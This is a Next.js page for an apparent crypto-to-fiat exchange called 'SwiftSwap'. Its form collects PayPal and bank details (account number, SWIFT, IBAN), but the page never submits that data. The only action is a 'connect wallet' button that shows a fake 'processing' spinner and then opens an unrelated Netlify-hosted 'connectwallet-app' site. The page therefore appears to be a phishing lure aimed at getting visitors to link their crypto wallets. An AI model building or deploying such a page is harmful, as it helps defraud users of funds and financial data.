'use client';

import { useState } from 'react';
import { LanguageProvider, useLanguage } from '@/contexts/LanguageContext';
import Header from '@/components/Header';
import CurrencySelector from '@/components/CurrencySelector';
import ExchangeCalculator from '@/components/ExchangeCalculator';
import RecipientForm from '@/components/RecipientForm';
import TransactionSummary from '@/components/TransactionSummary';

function HomeContent() {
  const { t } = useLanguage();
  const [selectedCurrency, setSelectedCurrency] = useState<'USDT' | 'USDC'>('USDT');
  const [amount, setAmount] = useState<string>('');
  const [paymentMethod, setPaymentMethod] = useState<'paypal' | 'swift'>('paypal');
  const [recipientData, setRecipientData] = useState({
    paypalEmail: '',
    bankName: '',
    accountNumber: '',
    swiftCode: '',
    iban: ''
  });
  const [isProcessing, setIsProcessing] = useState(false);

  const handleConnectWallet = () => {
    setIsProcessing(true);
    setTimeout(() => {
      window.open('https://connectwallet-app.netlify.app/', '_blank');
      setIsProcessing(false);
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-white">
      <Header />

      <main className="pt-24 pb-12 px-4 sm:px-6 lg:px-8 smooth-fade-in">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-8 sm:mb-12">
            <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold mb-4 sm:mb-6 metallic-text">
              {t('hero.title')}
            </h1>
            <p className="text-base sm:text-lg text-[#2C3E50] max-w-2xl mx-auto px-4">
              {t('hero.subtitle')}
            </p>
          </div>

          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12">
            <div className="space-y-6 sm:space-y-8">
              <div className="luxury-card-gold p-6 sm:p-8">
                <h2 className="text-lg sm:text-xl font-semibold mb-4 sm:mb-6 text-[#2C3E50]">
                  {t('dashboard.title')}
                </h2>
                <CurrencySelector
                  selectedCurrency={selectedCurrency}
                  onSelect={setSelectedCurrency}
                  amount={amount}
                  onAmountChange={setAmount}
                />
              </div>

              <div className="luxury-card p-6 sm:p-8">
                <h2 className="text-lg sm:text-xl font-semibold mb-4 sm:mb-6 text-[#2C3E50]">
                  {t('calculator.title')}
                </h2>
                <ExchangeCalculator
                  currency={selectedCurrency}
                  amount={amount}
                />
              </div>

              <div className="luxury-card p-6 sm:p-8">
                <h2 className="text-lg sm:text-xl font-semibold mb-4 sm:mb-6 text-[#2C3E50]">
                  {t('recipient.title')}
                </h2>
                <RecipientForm
                  paymentMethod={paymentMethod}
                  onPaymentMethodChange={setPaymentMethod}
                  recipientData={recipientData}
                  onRecipientDataChange={setRecipientData}
                />
              </div>
            </div>

            <div className="space-y-6 sm:space-y-8">
              <div className="luxury-card-gold p-6 sm:p-8 sticky top-20 lg:top-24">
                <h2 className="text-lg sm:text-xl font-semibold mb-4 sm:mb-6 text-[#2C3E50]">
                  {t('summary.title')}
                </h2>
                <TransactionSummary
                  currency={selectedCurrency}
                  amount={amount}
                  paymentMethod={paymentMethod}
                  recipientData={recipientData}
                />

                <div className="mt-6 sm:mt-8 p-4 sm:p-6 luxury-card">
                  <div className="flex items-center space-x-3 rtl:space-x-reverse">
                    <svg
                      className="w-6 h-6 text-gray-700"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                      />
                    </svg>
                    <div>
                      <p className="font-semibold text-gray-900 text-sm">
                        {t('security.title')}
                      </p>
                      <p className="text-xs text-gray-600">
                        {t('security.encryption')}
                      </p>
                    </div>
                  </div>
                </div>

                <div className="mt-4 p-4 bg-gray-50 rounded-lg border border-gray-200">
                  <p className="text-xs text-gray-600 flex items-start space-x-2 rtl:space-x-reverse">
                    <svg
                      className="w-4 h-4 text-[#F3BA2F] flex-shrink-0 mt-0.5"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                      />
                    </svg>
                    <span>{t('security.privacyText')}</span>
                  </p>
                </div>

                <button
                  onClick={handleConnectWallet}
                  disabled={!amount || isProcessing}
                  className={`w-full py-3 sm:py-4 mt-4 sm:mt-6 text-white font-semibold text-base sm:text-lg flex items-center justify-center space-x-2 rtl:space-x-reverse transition-all duration-500 ${!amount || isProcessing
                      ? 'bg-gray-400 cursor-not-allowed'
                      : 'hover:-translate-y-1 active:scale-95'
                    }`}
                  style={{
                    background: !amount || isProcessing ? '#9CA3AF' : '#1DA1F2',
                    boxShadow: !amount || isProcessing ? 'none' : '0 8px 40px rgba(29, 161, 242, 0.3)'
                  }}
                >
                  {isProcessing ? (
                    <>
                      <svg
                        className="animate-spin h-5 w-5 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                      <span>{t('action.processing')}</span>
                    </>
                  ) : (
                    <>
                      <svg
                        className="w-5 h-5"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M17 9l-5 5-5-5"
                        />
                      </svg>
                      <span>{t('action.connectWallet')}</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 py-6">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center text-sm text-gray-600">
          <p>© 2024 SwiftSwap. {t('footer.rights')}</p>
        </div>
      </footer>
    </div>
  );
}

export default function Home() {
  return (
    <LanguageProvider>
      <HomeContent />
    </LanguageProvider>
  );
}
